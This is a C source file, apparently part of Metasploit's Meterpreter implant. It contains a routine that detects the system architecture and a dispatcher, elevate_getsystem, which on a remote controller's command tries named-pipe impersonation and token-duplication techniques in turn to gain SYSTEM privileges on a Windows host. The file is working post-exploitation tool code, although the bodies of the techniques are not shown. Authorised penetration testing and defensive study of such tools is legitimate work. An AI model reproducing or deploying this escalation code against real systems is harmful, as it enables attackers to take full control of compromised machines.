/*!
 * @file elevate.c
 * @brief Definitions for SYSTEM privilege escalation.
 */
#include "precomp.h"
#include "namedpipe.h"
#include "tokendup.h"

/*!
 * @brief Get the native architecture of the system we are running on. (ripped from the stdapi's ps.c)
 * @return A flag indicating the architecture of the system.
 * @retval PROCESS_ARCH_X64 The architecture is AMD64.
 * @retval PROCESS_ARCH_IA64 The architecture is IA64.
 * @retval PROCESS_ARCH_X86 The architecture is X86.
 */
DWORD elevate_getnativearch( VOID )
{
	HMODULE hKernel                          = NULL;
	GETNATIVESYSTEMINFO pGetNativeSystemInfo = NULL;
	DWORD dwNativeArch                       = PROCESS_ARCH_UNKNOWN;
	SYSTEM_INFO SystemInfo                   = {0};

	do
	{
		// default to 'x86' as if kernel32!GetNativeSystemInfo is not present then we are on an old x86 system.
		dwNativeArch = PROCESS_ARCH_X86;

		hKernel = LoadLibraryA( "kernel32.dll" );
		if( !hKernel )
			break;

		pGetNativeSystemInfo = (GETNATIVESYSTEMINFO)GetProcAddress( hKernel, "GetNativeSystemInfo" );
		if( !pGetNativeSystemInfo )
			break;
				
		pGetNativeSystemInfo( &SystemInfo );
		switch( SystemInfo.wProcessorArchitecture )
		{
			case PROCESSOR_ARCHITECTURE_AMD64:
				dwNativeArch = PROCESS_ARCH_X64;
				break;
			case PROCESSOR_ARCHITECTURE_IA64:
				dwNativeArch = PROCESS_ARCH_IA64;
				break;
			case PROCESSOR_ARCHITECTURE_INTEL:
				dwNativeArch = PROCESS_ARCH_X86;
				break;
			default:
				dwNativeArch = PROCESS_ARCH_UNKNOWN;
				break;
		}

	} while( 0 );

	if( hKernel )
		FreeLibrary( hKernel );

	return dwNativeArch;
}

/*!
 * @brief Attempt to elevate the current meterpreter to local system using a variety of techniques.
 * @details This function attempts to get system level privileges using a number of techniques.
 *          If the caller hasn't specified a particular technique, then all of the known techniques are
 *          attempted in order until one succeeds.
 * @return Indication of success or failure.
 * @retval ERROR_SUCCESS Elevation to `SYSTEM` was successful.
 */
DWORD elevate_getsystem( Remote * remote, Packet * packet )
{
	DWORD dwResult    = ERROR_SUCCESS;
	DWORD dwTechnique = ELEVATE_TECHNIQUE_ANY;
	Packet * response = NULL;

	do
	{
		response = packet_create_response( packet );
		if( !response )
			BREAK_WITH_ERROR( "[ELEVATE] get_system. packet_create_response failed", ERROR_INVALID_HANDLE );

		dwTechnique = packet_get_tlv_value_uint( packet, TLV_TYPE_ELEVATE_TECHNIQUE );
		dprintf( "[ELEVATE] Technique requested (%u)", dwTechnique );
		
		if( dwTechnique == ELEVATE_TECHNIQUE_ANY || dwTechnique == ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE ) {
			dprintf( "[ELEVATE] Attempting ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE (%u)", ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE );
			if ( (dwResult = elevate_via_service_namedpipe( remote, packet )) == ERROR_SUCCESS ) {
				dwTechnique = ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE;
				break;
			}
		}
		
		if( dwTechnique == ELEVATE_TECHNIQUE_ANY || dwTechnique == ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2 ) {
			dprintf( "[ELEVATE] Attempting ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2 (%u)", ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2 );
			if ( (dwResult = elevate_via_service_namedpipe2( remote, packet )) == ERROR_SUCCESS ) {
				dwTechnique = ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2;
				break;
			}
		}
		
		if( dwTechnique == ELEVATE_TECHNIQUE_ANY || dwTechnique == ELEVATE_TECHNIQUE_SERVICE_TOKENDUP ) {
			dprintf( "[ELEVATE] Attempting ELEVATE_TECHNIQUE_SERVICE_TOKENDUP (%u)", ELEVATE_TECHNIQUE_SERVICE_TOKENDUP );
			if ( (dwResult = elevate_via_service_tokendup( remote, packet )) == ERROR_SUCCESS ) {
				dwTechnique = ELEVATE_TECHNIQUE_SERVICE_TOKENDUP;
				break;
			}
		}
	} while( 0 );

	if( response )
	{
		packet_add_tlv_uint( response, TLV_TYPE_ELEVATE_TECHNIQUE,  dwResult == ERROR_SUCCESS ? dwTechnique : ELEVATE_TECHNIQUE_NONE );
		packet_transmit_response( dwResult, remote, response );
	}

	return dwResult;
}
